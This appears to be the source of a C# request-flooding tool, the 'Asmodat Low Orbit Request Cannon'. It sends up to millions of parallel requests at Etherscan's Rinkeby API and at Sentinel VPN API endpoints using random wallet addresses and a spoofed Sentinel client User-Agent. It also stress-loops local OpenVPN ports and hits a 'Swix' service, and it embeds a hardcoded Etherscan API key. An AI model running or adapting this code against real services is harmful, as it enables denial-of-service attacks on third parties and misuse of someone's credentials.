using System;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net.Http;
using System.Text;
using System.Threading.Tasks;
using AsmodatStandard.Extensions;
using AsmodatStandard.Extensions.Threading;
using AsmodatStandard.IO;
using AsmodatStandard.Extensions.Collections;

namespace AsmodatLowOrbitRequestCannon
{
    public class Etherscan
    {
        public string status;
        public string message;
        public string result;
    }

    public class VpnxList
    {
        public bool success;
        public object list;
    }

    public class VpnxUsage
    {
        public bool success;
        public object usage;
    }

    public class VpnxAvailable
    {
        public bool success;
        public object[] tokens;
    }

    class Program
    {
        private readonly static object _locker = new object();

        static void Main(string[] args)
        {
            var nArgs = CLIHelper.GetNamedArguments(args);
            var intensity = nArgs.GetValueOrDefault("intensity", "1000000").ToInt32();
            var batch = nArgs.GetValueOrDefault("batch", "15").ToInt32();
            var parallel = nArgs.GetValueOrDefault("parallel", "15").ToInt32();
            var verify = nArgs.GetValueOrDefault("verify", "true").ToBool();

            Console.WriteLine("Asmodat Low Orbit Request Cannon v0.2");
            Console.WriteLine($"Total requests: {intensity * batch}, Per Batch: {batch}, Parallelization: {parallel}");

            if (nArgs["mode"] == "vpnx")
                Run3(intensity, batch, parallel);
            else if (nArgs["mode"] == "vpn")
                Run2(intensity, parallel, nArgs["ovpn"], nArgs["exe"]);
            else if (nArgs["mode"] == "swixer")
                Run(intensity, batch, parallel, verify);
            else
                throw new Exception("Unknown mode");

            Console.WriteLine("Done");
        }

        private static void Run3(int intensity1, int intensity2, int intensity3)
        {
            var sw = Stopwatch.StartNew();
            int sCounter = 0;
            int fCOunter = 0;
            string lastException = "";
            Parallel.For(0, intensity1, new ParallelOptions() { MaxDegreeOfParallelism = intensity3 }, i => {
                async Task RunAsync()
                {
                    bool success;

                    try
                    {
                        success = await Vpnx();

                        lock (_locker)
                        {
                            if (success)
                                ++sCounter;
                            else
                                ++fCOunter;
                        }
                    }
                    catch (Exception ex)
                    {
                        lock (_locker)
                            ++fCOunter;

                        lastException = ex.JsonSerializeAsPrettyException(Newtonsoft.Json.Formatting.Indented);
                    }
                }

                var collection = new Task[intensity2];
                for (int i2 = 0; i2 < collection.Length; i2++)
                    collection[i2] = RunAsync();

                Task.WaitAll(Task.WhenAll(collection));

                Console.WriteLine($"\n[{sw.ElapsedMilliseconds / 1000} s] Success: {sCounter}, Failed: {fCOunter}, Total: {sCounter + fCOunter}, Last Error: {lastException}");
            });
        }

        public static async Task<bool> Vpnx()
        {
            using (var client = new HttpClient() { Timeout = TimeSpan.FromMinutes(60), MaxResponseContentBufferSize = int.MaxValue })
            {
                var address = $"0x{RandomEx.NextHexString(40)}";
                var apiKEY = "Y5BJ5VA3XZ59F63XQCQDDUWU2C29144MMM";

                var url1 = $"https://api-rinkeby.etherscan.io/api?apikey={apiKEY}&module=account&action=balance&tag=latest&address={address}";

                var balance = client.GET<Etherscan>(new Uri(url1), System.Net.HttpStatusCode.OK, true, ("Accept", "application/json"), ("Content-type", "application/json"));
                var list = client.GET<VpnxList>(new Uri("https://api.sentinelgroup.io/client/vpn/list"), System.Net.HttpStatusCode.OK);
                var available = client.GET<VpnxAvailable>(new Uri("https://api.sentinelgroup.io/swaps/available"), System.Net.HttpStatusCode.OK);
                var content = new StringContent($"{{\"account_addr\": \"{address}\"}}", encoding: Encoding.UTF8);
                var usage = await client.POST<VpnxUsage>("https://api.sentinelgroup.io/client/vpn/usage", content, System.Net.HttpStatusCode.OK, true,
                ("accept", "application/json"),
                ("Accept-Encoding", "gzip, deflate"),
                ("Accept-Language", "en-US"),
                ("Connection", "keep-alive"),
                ("Host", "api.sentinelgroup.io"),
                ("Origin", "null"),
                ("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Sentinel/0.0.41 Chrome/59.0.3071.115 Electron/1.8.7 Safari/537.36"),
                ("X-DevTools-Request-Id", $"{RandomEx.Next(1000,10000)}.{RandomEx.Next(100, 1000)}"));

                if ((await balance).message == "OK" && (await list).success && (await available).success && usage.success)
                    return true;
                else
                    return false;
            }
        }

        private static void Run2(int intensity1, int intentisty3, string ovpnFile, string ovpnExe)
        {
            var ovpnFileContent = File.ReadAllLines(ovpnFile);

            var sw = Stopwatch.StartNew();
            int sCounter = 0;
            int fCOunter = 0;
            string lastException = null;
            for (var r = 0; r < intensity1; r++)
            {
                var ports = NetHelper.ListUsedPortsTCP();

                Parallel.For(14415, 46337, new ParallelOptions() { MaxDegreeOfParallelism = intentisty3 }, i =>
                {
                    if (!ports.Contains(i))
                    {
                        var result = StressVPN("127.0.0.1", i, ovpnFileContent, ovpnExe, out var ex);

                        lock (_locker)
                        {
                            if (result)
                                ++sCounter;
                            else
                                ++fCOunter;
                        }

                        if (ex != null)
                            lastException = ex.JsonSerializeAsPrettyException(Newtonsoft.Json.Formatting.Indented);
                    }

                    if(i % 50 == 0)
                        Console.WriteLine($"\n[{sw.ElapsedMilliseconds / 1000} s] Success: {sCounter}, Failed: {fCOunter}, Total: {sCounter + fCOunter}, Last Error: {lastException}");
                });
            }
        }

        public static bool StressVPN(string host, int port, string[] content, string ovpnExe, out Exception exception)
        {
            try
            {
                using (OpenVPN openVPN = new OpenVPN(host, port, content, ovpnExe))
                {
                    openVPN.SetLogOnAll();
                    openVPN.GetPid();
                    openVPN.SendSignal(OpenVPN.Signal.Usr1);
                    exception = null;
                    return true;
                }
            }
            catch (Exception ex)
            {
                exception = ex;
                return false;
            }
        }

        private static void Run(int intensity1, int intensity2, int intensity3, bool verify)
        {
            var sw = Stopwatch.StartNew();
            int sCounter = 0;
            int fCOunter = 0;
            string lastException = "";
            Parallel.For(0, intensity1, new ParallelOptions() { MaxDegreeOfParallelism = intensity3 }, i => {
                async Task RunAsync()
                {
                    bool success;
                    try
                    {
                        success = await SwixConnect.Swix(verify);

                        lock (_locker)
                        {
                            if (success)
                                ++sCounter;
                            else
                                ++fCOunter;
                        }
                    }
                    catch(Exception ex)
                    {
                        lock (_locker)
                            ++fCOunter;

                        lastException = ex.JsonSerializeAsPrettyException(Newtonsoft.Json.Formatting.Indented);
                    }
                }

                var collection = new Task[intensity2];
                for (int i2 = 0; i2 < collection.Length; i2++)
                    collection[i2] = RunAsync();

                Task.WaitAll(Task.WhenAll(collection));

                Console.WriteLine($"\n[{sw.ElapsedMilliseconds/1000} s] Success: {sCounter}, Failed: {fCOunter}, Total: {sCounter + fCOunter}, Last Error: {lastException}");
            });
        }
    }
}
